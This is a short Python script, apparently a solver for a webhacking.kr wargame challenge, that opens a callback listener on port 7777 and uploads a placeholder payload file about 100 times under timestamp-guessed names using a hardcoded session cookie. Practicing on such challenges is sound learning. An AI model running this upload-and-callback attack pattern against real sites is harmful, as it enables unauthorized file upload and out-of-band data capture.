# If you want to solve this prob
# You have to use your public ip server

import socket
import threading
import requests
import time

URL = "https://webhacking.kr/challenge/web-18/"
UPFILE = "tmp-"
TIMESTAMP = int(time.time())

COOKIES = {
	"PHPSESSID": "mpkd577e0q8p2jgb5na52aovld"
}

def listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 7777))
    s.listen(1)
    conn, addr = s.accept()
    data = conn.recv(4096)
    print(data.decode())
    conn.close()
    s.close()

t = threading.Thread(target=listener)
t.daemon = True
t.start()


with open("payload", "w") as f:
	f.write("attack")

f = open("payload", "rb")

for idx in range(100):
	FILE = {
		"upfile": (UPFILE + str(TIMESTAMP + idx), f)
	}

	resp = requests.post(url = URL, cookies = COOKIES, files = FILE)

resp = requests.get(url = URL, cookies = COOKIES)

f.close()

t.join(timeout=10)
